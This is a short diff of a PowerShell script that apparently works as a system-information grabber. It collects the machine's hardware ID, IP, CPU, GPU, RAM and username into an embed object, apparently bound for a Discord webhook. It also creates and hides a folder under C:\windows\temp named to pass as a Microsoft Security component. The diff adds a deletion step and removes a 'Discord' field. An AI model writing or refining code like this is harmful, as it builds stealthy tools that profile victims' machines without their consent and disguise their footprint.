@@ -13,6 +13,7 @@ $hwid = (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID
 $ram = (Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).sum /1gb
 md C:\windows\temp\Win.microsoft.Security.temp
 cls
+Remove-Item -Path "C:\windows\temp\Win.microsoft.Security.temp"
 attrib +h "C:\windows\temp\Win.microsoft.Security.temp"
 cls
 #####################################################################
@@ -79,8 +80,7 @@ $description = 'IP: ' + '`' + $ip + '`' + '
 GPU: ' + '`' + $GPU + '`' + '
 CPU: ' + '`' + $CPU + '`' + '
 RAM: ' + '`' + $ram + '`' + '
-HWID: ' + '`' + $hwid + '`' + '
-Discord: '
+HWID: ' + '`' + $hwid + '`' 
 $embedObject = [PSCustomObject]@{
     color = $color
     title = $title + '`' + $env:UserName + '`'
